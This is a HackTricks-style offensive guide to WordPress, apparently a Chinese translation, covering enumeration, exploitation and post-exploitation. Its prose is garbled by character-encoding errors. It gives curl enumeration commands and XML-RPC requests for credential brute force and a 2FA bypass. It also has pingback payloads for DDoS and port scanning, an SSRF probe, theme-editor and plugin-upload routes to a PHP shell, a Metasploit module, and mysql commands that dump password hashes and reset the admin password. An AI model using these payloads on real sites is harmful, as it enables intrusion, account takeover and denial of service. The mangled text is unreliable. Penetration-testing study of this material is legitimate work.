# Wordpress

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## åŸºæœ¬ä¿¡æ¯

**ä¸Šä¼ ** çš„æ–‡ä»¶ä½äº: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**ä¸»é¢˜æ–‡ä»¶å¯ä»¥åœ¨ /wp-content/themes/ ä¸­æ‰¾åˆ°ï¼Œ** æ‰€ä»¥å¦‚æœä½ æ›´æ”¹ä¸»é¢˜çš„ä¸€äº› php æ–‡ä»¶ä»¥è·å– RCEï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** ä½ å¯ä»¥ **è®¿é—®** **404.php** æ–‡ä»¶åœ¨: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**å¦ä¸€ä¸ªæœ‰ç”¨çš„ URL å¯èƒ½æ˜¯:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

åœ¨ **wp-config.php** ä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚

é»˜è®¤ç™»å½•è·¯å¾„æ£€æŸ¥: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦ WordPress æ–‡ä»¶**

* `index.php`
* `license.txt` åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
* `wp-activate.php` ç”¨äºè®¾ç½®æ–° WordPress ç½‘ç«™æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚
* ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰ï¼š
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨ WordPress çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶å’Œ XML ä½œä¸ºç¼–ç æœºåˆ¶ä¼ è¾“æ•°æ®ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢« WordPress [REST API](https://developer.wordpress.org/rest-api/reference) å–ä»£ã€‚
* `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨æ’ä»¶å’Œä¸»é¢˜çš„ä¸»è¦ç›®å½•ã€‚
* `wp-content/uploads/` æ˜¯å­˜å‚¨ä¸Šä¼ åˆ°å¹³å°çš„ä»»ä½•æ–‡ä»¶çš„ç›®å½•ã€‚
* `wp-includes/` è¿™æ˜¯å­˜å‚¨æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚
* `wp-sitemap.xml` åœ¨ WordPress ç‰ˆæœ¬ 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å…±å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„å¸–å­ç±»å‹åŠåˆ†ç±»æ³•çš„ sitemap XML æ–‡ä»¶ã€‚

**åæœŸåˆ©ç”¨**

* `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€èº«ä»½éªŒè¯å¯†é’¥å’Œç›ï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚æ­¤é…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºæ¿€æ´» DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶å¯èƒ½å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

* **ç®¡ç†å‘˜**
* **ç¼–è¾‘è€…**: å‘å¸ƒå’Œç®¡ç†ä»–å’Œå…¶ä»–äººçš„å¸–å­
* **ä½œè€…**: å‘å¸ƒå’Œç®¡ç†è‡ªå·±çš„å¸–å­
* **è´¡çŒ®è€…**: æ’°å†™å’Œç®¡ç†è‡ªå·±çš„å¸–å­ä½†ä¸èƒ½å‘å¸ƒ
* **è®¢é˜…è€…**: æµè§ˆå¸–å­å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å– WordPress ç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆæ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) çš„ç¤ºä¾‹ï¼‰:

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* CSSé“¾æ¥æ–‡ä»¶

![](<../../.gitbook/assets/image (533).png>)

* JavaScriptæ–‡ä»¶

![](<../../.gitbook/assets/image (524).png>)

### è·å–æ’ä»¶

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–ç‰ˆæœ¬ä¿¡æ¯

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

æ‚¨å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°å®ƒä»¬ï¼Œæ‚¨éœ€è¦ **ä¸»åŠ¨æš´åŠ›ç ´è§£æ’ä»¶å’Œä¸»é¢˜çš„åˆ—è¡¨**ï¼ˆå¸Œæœ›å¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

**ID æš´åŠ›ç ´è§£**

æ‚¨å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£ç”¨æˆ· ID ä» WordPress ç½‘ç«™è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¿™æ„å‘³ç€ id æ˜¯ **æœ‰æ•ˆ** çš„ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œé‚£ä¹ˆ id æ˜¯ **æ— æ•ˆ** çš„ã€‚

**wp-json**

æ‚¨è¿˜å¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯ä»¥æ­ç¤ºç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
æ³¨æ„ï¼Œæ­¤ç«¯ç‚¹ä»…æš´éœ²å·²å‘å¸ƒå¸–å­çš„ç”¨æˆ·ã€‚**ä»…æä¾›å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

è¿˜è¦æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼šæ³„éœ² IP åœ°å€ã€‚

#### ç™»å½•ç”¨æˆ·åæšä¸¾

åœ¨ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æ¶ˆæ¯**åœ¨æŒ‡ç¤ºçš„ **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨** æ—¶æ˜¯ **ä¸åŒçš„**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå‡­æ®æš´åŠ›ç ´è§£æˆ–ä½¿ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ï¼ˆæ‚¨å¯ä»¥é€šè¿‡[ä½¿ç”¨è¿™ä¸ª](https://github.com/relarizky/wpxploit)æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼Œä¾‹å¦‚ï¼‰ã€‚

è¦æŸ¥çœ‹å®ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·å°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€æ­¤è¯·æ±‚ï¼š

**æ£€æŸ¥**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**å‡­è¯æš´åŠ›ç ´è§£**

**`wp.getUserBlogs`**ã€**`wp.getCategories`** æˆ– **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥æš´åŠ›ç ´è§£å‡­è¯çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼äºï¼š
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
åœ¨200ä»£ç å“åº”ä¸­ï¼Œå¦‚æœå‡­æ®æ— æ•ˆï¼Œåº”è¯¥å‡ºç°æ¶ˆæ¯ _"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"_ã€‚

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­æ®ï¼Œæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ï¼Œè·¯å¾„å°†ä¼šå‡ºç° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
è¿˜æœ‰ä¸€ç§**æ›´å¿«çš„æ–¹æ³•**å¯ä»¥ä½¿ç”¨**`system.multicall`**è¿›è¡Œæš´åŠ›ç ´è§£å‡­æ®ï¼Œå› ä¸ºæ‚¨å¯ä»¥åœ¨åŒä¸€è¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

æ­¤æ–¹æ³•æ˜¯é’ˆå¯¹ç¨‹åºè€Œéäººç±»çš„ï¼Œå¹¶ä¸”è¾ƒæ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æœ‰æ•ˆçš„å‡­æ®ï¼Œä½†ä¸»è¦å…¥å£å—åˆ° 2FA ä¿æŠ¤ï¼Œ**æ‚¨å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA**ã€‚è¯·æ³¨æ„ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ‚¨ä»ç„¶å¯èƒ½èƒ½å¤Ÿè¾¾åˆ° RCEï¼Œæ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s) ä¸­è§£é‡Šçš„é‚£æ ·ã€‚

**DDoS æˆ–ç«¯å£æ‰«æ**

å¦‚æœæ‚¨å¯ä»¥åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°æ–¹æ³• _**pingback.ping**_ï¼Œåˆ™å¯ä»¥ä½¿ Wordpress å‘ä»»ä½•ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨æ¥è¯·æ±‚**æˆåƒä¸Šä¸‡**çš„ Wordpress **ç«™ç‚¹**å»**è®¿é—®**ä¸€ä¸ª**ä½ç½®**ï¼ˆå› æ­¤åœ¨è¯¥ä½ç½®é€ æˆ**DDoS**ï¼‰æˆ–è€…æ‚¨å¯ä»¥ç”¨å®ƒè®©**Wordpress**å»**æ‰«æ**ä¸€äº›å†…éƒ¨**ç½‘ç»œ**ï¼ˆæ‚¨å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ°çš„ **faultCode** å€¼ **å¤§äº** **0** (17)ï¼Œè¿™æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ä½¿ç”¨ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨æ­¤æ–¹æ³•é€ æˆ DDoSã€‚

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸ä½äºWordpressç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼š**`/wp-cron.php`**\
å½“è®¿é—®æ­¤æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªâ€œ**é‡**â€çš„MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤å¯èƒ½è¢«**æ”»å‡»è€…**ç”¨æ¥**é€ æˆ****DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php`åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆæ¯å½“å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•Wordpressé¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç½‘ç«™ä¸Šå¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„cronjobï¼Œä»¥å®šæœŸæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆè€Œä¸é€ æˆé—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—®_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordpressç«™ç‚¹å¯èƒ½ä¼šå‘æ‚¨å‘å‡ºè¯·æ±‚ã€‚

å½“å®ƒä¸èµ·ä½œç”¨æ—¶çš„å“åº”æ˜¯ï¼š

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

æ­¤å·¥å…·æ£€æŸ¥**methodName: pingback.ping**å’Œè·¯å¾„**/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œå®ƒä¼šå°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

### è‡ªåŠ¨å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## é€šè¿‡è¦†ç›–ä¸€ç‚¹è·å–è®¿é—®æƒé™

è¿™ä¸ä»…ä»…æ˜¯çœŸæ­£çš„æ”»å‡»ï¼Œè€Œæ˜¯ä¸€ç§å¥½å¥‡ã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»ä½• wordpress æ–‡ä»¶çš„ 1 ä½ã€‚å› æ­¤ï¼Œä½ å¯ä»¥å°†æ–‡ä»¶ `/var/www/html/wp-includes/user.php` çš„ä½ç½® `5389` ç¿»è½¬ä¸º NOP NOT (`!`) æ“ä½œã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜çš„ phpï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­æ®ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../.gitbook/assets/image (384).png>)

åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥æ›´æ–°é¡µé¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¿…é¡»è®¿é—®è¿™é‡Œ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

æ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## æ’ä»¶ RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä½¿ç”¨ä¾‹å¦‚ä»¥ä¸‹æ–¹æ³•åˆ›å»ºä½ çš„ php åé—¨ï¼š

![](<../../.gitbook/assets/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š

![](<../../.gitbook/assets/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶æŒ‰â€œç«‹å³å®‰è£…â€ï¼š

![](<../../.gitbook/assets/image (249).png>)

ç‚¹å‡»â€œç»§ç»­â€ï¼š

![](<../../.gitbook/assets/image (70).png>)

è¿™å¯èƒ½è¡¨é¢ä¸Šä¸ä¼šæœ‰ä»€ä¹ˆååº”ï¼Œä½†å¦‚æœä½ å»åª’ä½“ï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../.gitbook/assets/image (462).png>)

è®¿é—®å®ƒï¼Œä½ å°†çœ‹åˆ°æ‰§è¡Œåå‘ shell çš„ URLï¼š

![](<../../.gitbook/assets/image (1006).png>)

### ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶

æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„æ’ä»¶ï¼Œå¹¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å– web shellã€‚æ­¤è¿‡ç¨‹é€šè¿‡ WordPress ä»ªè¡¨æ¿è¿›è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

1. **æ’ä»¶è·å–**ï¼šä» Exploit DB ç­‰æ¥æºè·å–æ’ä»¶ï¼Œå¦‚ [**è¿™é‡Œ**](https://www.exploit-db.com/exploits/36374)ã€‚
2. **æ’ä»¶å®‰è£…**ï¼š
* å¯¼èˆªåˆ° WordPress ä»ªè¡¨æ¿ï¼Œç„¶åè½¬åˆ° `ä»ªè¡¨æ¿ > æ’ä»¶ > ä¸Šä¼ æ’ä»¶`ã€‚
* ä¸Šä¼ ä¸‹è½½æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **æ’ä»¶æ¿€æ´»**ï¼šæ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨æ¿æ¿€æ´»ã€‚
4. **åˆ©ç”¨**ï¼š
* å®‰è£…å¹¶æ¿€æ´»æ’ä»¶â€œreflex-galleryâ€åï¼Œå¯ä»¥åˆ©ç”¨å®ƒï¼Œå› ä¸ºå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚
* Metasploit æ¡†æ¶æä¾›äº†è¯¥æ¼æ´çš„åˆ©ç”¨å·¥å…·ã€‚é€šè¿‡åŠ è½½é€‚å½“çš„æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªç»æˆæƒè®¿é—®ã€‚
* æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…æ‹¬æè¿°åœ¨ WordPress ä»ªè¡¨æ¿ä¸­å®‰è£…å’Œæ¿€æ´»æ’ä»¶æ­¥éª¤çš„è§†è§‰è¾…åŠ©å·¥å…·ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…åœ¨åˆæ³•èƒŒæ™¯ä¸‹ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨è·å¾—æ˜ç¡®è®¸å¯çš„æ¸—é€æµ‹è¯•ä¸­ã€‚

**æœ‰å…³æ›´è¯¦ç»†çš„æ­¥éª¤ï¼Œè¯·æŸ¥çœ‹ï¼š** [**https://www.hackingarticles.in/wordpress-reverse-shell/\*\***](https://www.hackingarticles.in/wordpress-reverse-shell/)

## åæœŸåˆ©ç”¨

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPress ä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€æ’ä»¶å’Œä¸»é¢˜æ˜¯æœ€æ–°çš„ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ä¹Ÿ**åªå®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

* åˆ é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
* ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
* å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
* **é™åˆ¶ç™»å½•å°è¯•** ä»¥é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»
